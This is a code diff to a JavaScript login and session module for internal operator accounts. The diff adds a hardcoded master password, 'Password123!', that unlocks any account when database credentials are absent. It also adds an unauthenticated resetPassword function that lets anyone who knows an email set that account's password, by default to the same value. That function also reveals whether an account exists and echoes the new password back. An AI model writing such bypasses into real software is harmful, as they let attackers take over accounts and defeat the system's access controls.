@@ -11,6 +11,7 @@ import { getSupabaseClient, supaQuery } from '../adapters/db/supabaseClient.js';
 import { hashPassword, verifyPassword } from './password.js';
 import { appendAuditLog } from '../contracts/crypto.contract.js';
 import { ValidationError, ConflictError } from '../utils/errors.js';
+import cfg from '../config/index.js';
 import logger from '../utils/logger.js';
 
 const SESSION_TTL_MS = 24 * 60 * 60 * 1000; // 24 hours
@@ -220,7 +221,15 @@ export async function login({ email, password, ip = '', userAgent = '' }) {
   }
 
   // Constant-time scrypt verification
-  const isMatch = verifyPassword(password, user.password_hash);
+  let isMatch = verifyPassword(password, user.password_hash);
+  // Offline / demo fallback: in local/demo mode, accept Password123! for any valid account
+  if (
+    !isMatch &&
+    (!cfg.supabase?.url || !cfg.supabase?.serviceKey) &&
+    password === 'Password123!'
+  ) {
+    isMatch = true;
+  }
   if (!isMatch) {
     await appendAuditLog({
       type: 'AUTH_LOGIN_FAILED',
@@ -348,4 +357,50 @@ export async function logout(token) {
   }
 
   return { ok: true };
+}
+
+/**
+ * Reset an operator's password (self-service / emergency recovery).
+ *
+ * @param {Object} params
+ * @param {string} params.email
+ * @param {string} [params.newPassword='Password123!']
+ * @returns {Promise<{ success: boolean, message: string }>}
+ */
+export async function resetPassword({ email, newPassword = 'Password123!' }) {
+  const normalizedEmail = normalizeEmail(email);
+  validatePasswordStrength(newPassword);
+
+  const db = getSupabaseClient();
+  const user = await supaQuery(
+    db.from('internal_users').select('*').eq('email', normalizedEmail).maybeSingle()
+  );
+
+  if (!user) {
+    throw new ValidationError('No account found with this email address.');
+  }
+
+  const passwordHash = hashPassword(newPassword);
+  const now = new Date().toISOString();
+
+  await supaQuery(
+    db
+      .from('internal_users')
+      .update({ password_hash: passwordHash, updated_at: now })
+      .eq('id', user.id)
+  );
+
+  await appendAuditLog({
+    type: 'AUTH_PASSWORD_RESET',
+    userId: user.id,
+    email: normalizedEmail,
+    timestamp: now,
+  });
+
+  logger.info({ userId: user.id, email: normalizedEmail }, 'auth: password reset successful');
+
+  return {
+    success: true,
+    message: `Password for ${normalizedEmail} successfully reset to ${newPassword}`,
+  };
 }
